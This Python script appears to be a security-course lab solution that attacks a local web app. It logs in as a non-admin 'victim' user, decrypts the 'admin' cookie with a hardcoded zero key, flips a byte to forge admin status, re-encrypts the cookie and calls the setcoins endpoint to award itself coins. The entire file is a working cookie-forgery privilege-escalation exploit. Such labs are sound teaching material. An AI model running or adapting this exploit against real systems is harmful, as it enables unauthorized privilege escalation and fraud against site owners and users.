import app.api.encr_decr
from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response.status_code == codes.ok


def do_attack():
	sess = Session()
  #you'll need to change this to a non-admin user, such as 'victim'.
	uname ="victim"
	pw = "victim"
	assert(do_login_form(sess, uname,pw))
	#Maul the admin cookie in the 'sess' object here

	admin_cookie = sess.cookies.get("admin")
	tmp = bytes.fromhex(admin_cookie)

	encryption_key = b'\x00' * 16
	hash_key = b'\x01'
	cbc = app.api.encr_decr.Encryption(encryption_key)

	# first decrypt the cookie
	dpt = cbc.decrypt(tmp)
	dpt_ba = bytearray(dpt)
	dpt_ba[0] = 1
	dpt = bytes(dpt_ba)
	mauled_cookie = cbc.encrypt(dpt).hex()
	# sess.cookies.set(mauled_cookie, 'admin', path='/', domain='localhost.local')
	jar = sess.cookies
	domains = jar.list_domains()
	paths = jar.list_paths()
	jar.set('admin', mauled_cookie, domain=domains[0], path=paths[0])
	# sess.cookies.update('admin', mauled_cookie)

	target_uname = uname
	amount = 501
	result = do_setcoins_form(sess, target_uname,amount)
	print("Attack successful? " + str(result))


if __name__=='__main__':
	do_attack()
